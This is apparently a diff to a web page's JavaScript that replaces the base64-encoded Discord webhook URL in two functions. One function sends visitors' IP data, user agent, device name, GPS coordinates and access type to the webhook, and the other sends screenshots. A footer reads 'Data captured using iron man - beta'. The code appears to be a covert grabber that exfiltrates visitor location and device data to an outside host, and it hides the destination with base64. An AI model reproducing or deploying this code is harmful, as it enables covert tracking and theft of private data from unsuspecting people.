@@ -290,7 +290,7 @@
         return data.data.link;
       }
       async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType) {
-        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzA4NTQ5NzU4MzE0MDkzNS91eU9TZ2cwM3VGbU85UFVwN1JsUVFlS0lKUjBBZ1RrWTdFUW0wdWxtaDByWkI4TllEellDTlcxNUJRU3dEcXh5NGNOSg==";
+        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyODg5NjQ3OTE5NjIyMTUyMS9PUHk1UllvLWJhWTBVTC0ySHZkTG1SeFVuSmZodWlITDRVbXlKUWI0Z1J1ZnZrVlNwYVJUUzdnTF92OEFTem1CdzMzUA==";
         const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
         const webhookUrl = atob(encryptedWebhookUrl);
         const now = new Date();
@@ -342,7 +342,7 @@
         });
       }
       async function sendScreenshotToDiscord(imageUrl) {
-        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzA4NTQ5NzU4MzE0MDkzNS91eU9TZ2cwM3VGbU85UFVwN1JsUVFlS0lKUjBBZ1RrWTdFUW0wdWxtaDByWkI4TllEellDTlcxNUJRU3dEcXh5NGNOSg==";
+        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyODg5NjQ3OTE5NjIyMTUyMS9PUHk1UllvLWJhWTBVTC0ySHZkTG1SeFVuSmZodWlITDRVbXlKUWI0Z1J1ZnZrVlNwYVJUUzdnTF92OEFTem1CdzMzUA==";
         const now = new Date();
         const webhookUrl = atob(encryptedWebhookUrl);
         const footerText = `${now.toLocaleString()} - Data captured using iron man - beta`;
